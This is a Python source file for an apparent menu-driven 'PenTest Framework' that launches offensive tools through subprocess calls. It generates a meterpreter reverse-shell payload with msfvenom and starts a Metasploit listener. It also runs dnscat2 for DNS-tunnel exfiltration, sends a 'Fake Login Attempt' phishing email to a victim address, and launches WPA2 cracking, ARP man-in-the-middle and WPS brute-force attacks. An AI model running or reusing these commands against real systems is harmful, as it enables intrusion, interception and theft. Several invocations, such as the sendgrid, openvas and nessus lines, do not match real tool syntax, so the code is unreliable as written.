import os
from pyfiglet import figlet_format
from termcolor import colored
import subprocess
import time

# Function to display the main banner
def display_banner():
    banner = figlet_format("PenTest Framework")
    print(colored(banner, "cyan"))
    print(colored("By 41PH4-01: Comprehensive Ethical Hacking Toolkit", "yellow"))
    print(colored("=" * 70, "green"))
    print("\nChoose an option to start exploring advanced features below:\n")

# Function to display section headers
def display_section_header(title):
    print(colored(f"\n[--- {title} ---]", "magenta"))
    print(colored("-" * (len(title) + 10), "white"))

# Function to display the main menu with options
def main_menu():
    menu_options = {
        1: "Information Gathering",
        2: "Web Application Testing",
        3: "Payload Generation",
        4: "Post-Exploitation Tools",
        5: "Social Engineering",
        6: "Wi-Fi & Network Attacks",
        7: "Vulnerability Scanning",
        8: "Exit Framework"
    }
    
    print("\nSelect an option:")
    for key, value in menu_options.items():
        print(colored(f"[{key}] {value}", "blue"))

# Information Gathering
def information_gathering():
    display_section_header("Information Gathering")
    print("Running domain enumeration...")
    subprocess.run(['sublist3r', '-d', 'example.com'])  # Sublist3r for subdomain enumeration
    print("Running Shodan scan...")
    subprocess.run(['shodan', 'search', 'example.com'])  # Shodan API scan
    print("Running Whois...")
    subprocess.run(['whois', 'example.com'])  # Whois lookup

# Web Application Testing
def web_application_testing():
    display_section_header("Web Application Testing")
    print("Running SQLMap for SQL Injection testing...")
    subprocess.run(['sqlmap', '-u', 'http://example.com/page.php?id=1'])  # SQLMap test
    print("Running XSStrike for XSS testing...")
    subprocess.run(['xsstrike', '-u', 'http://example.com/login'])  # XSStrike XSS testing
    print("Running Nikto for web vulnerability scanning...")
    subprocess.run(['nikto', '-h', 'http://example.com'])  # Nikto scan for common vulnerabilities

# Payload Generation
def payload_generation():
    display_section_header("Payload Generation")
    print("Generating reverse shell payload with msfvenom...")
    subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=127.0.0.1', 'LPORT=4444', '-f', 'exe', '-o', 'payload.exe'])
    print("Payload created: payload.exe")
    
    # Launch listener in background
    print("Starting Metasploit listener...")
    subprocess.run(['msfconsole', '-x', 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'])

# Post-Exploitation Tools
def post_exploitation_tools():
    display_section_header("Post-Exploitation Tools")
    print("Running privilege escalation...")
    subprocess.run(['linux-exploit-suggester'])  # LPE suggestion for Linux systems
    subprocess.run(['windows-exploit-suggester'])  # LPE suggestion for Windows systems
    print("Exfiltrating data via DNS tunneling...")
    subprocess.run(['dnscat2', '-l', '127.0.0.1:53'])  # Data exfiltration using dnscat2

# Social Engineering (Phishing, Email Campaigns)
def social_engineering():
    display_section_header("Social Engineering")
    print("Setting up GoPhish for phishing...")
    subprocess.run(['gophish', 'start'])  # Start GoPhish for phishing campaigns
    print("Creating phishing emails...")
    subprocess.run(['sendgrid', 'send', '--to', 'victim@example.com', '--subject', 'Fake Login Attempt'])  # SendGrid for phishing emails

# Wi-Fi & Network Attacks
def wifi_network_attacks():
    display_section_header("Wi-Fi & Network Attacks")
    print("Running aircrack-ng for WPA2 attack...")
    subprocess.run(['aircrack-ng', 'capture.cap'])  # WPA2 Crack with Aircrack
    print("Running Ettercap for MITM attack...")
    subprocess.run(['ettercap', '-T', '-q', '-i', 'eth0', '-M', 'ARP', '/192.168.1.1/', '/192.168.1.100/'])  # MITM with Ettercap
    print("Running Reaver for WPS brute force attack...")
    subprocess.run(['reaver', '-i', 'wlan0', '-b', '00:11:22:33:44:55', '-vv'])  # WPS brute force with Reaver

# Vulnerability Scanning (Nessus & OpenVAS)
def vulnerability_scanning():
    display_section_header("Vulnerability Scanning")
    print("Running OpenVAS scan...")
    subprocess.run(['openvas', '--scan', '--target', 'http://example.com'])  # OpenVAS scan
    print("Running Nessus scan...")
    subprocess.run(['nessus', '--scan', '--target', 'http://example.com'])  # Nessus scan

# Main function to handle user interaction
if __name__ == "__main__":
    # Display the banner at the start
    display_banner()

    # Main loop to handle user selections
    while True:
        main_menu()
        try:
            choice = int(input(colored("\nEnter your choice: ", "yellow")))
            if choice == 1:
                information_gathering()
            elif choice == 2:
                web_application_testing()
            elif choice == 3:
                payload_generation()
            elif choice == 4:
                post_exploitation_tools()
            elif choice == 5:
                social_engineering()
            elif choice == 6:
                wifi_network_attacks()
            elif choice == 7:
                vulnerability_scanning()
            elif choice == 8:
                print(colored("Exiting... Thank you for using the toolkit!", "red"))
                break
            else:
                print(colored("Invalid choice, please select a valid option.", "red"))
        except ValueError:
            print(colored("Please enter a valid number.", "red"))
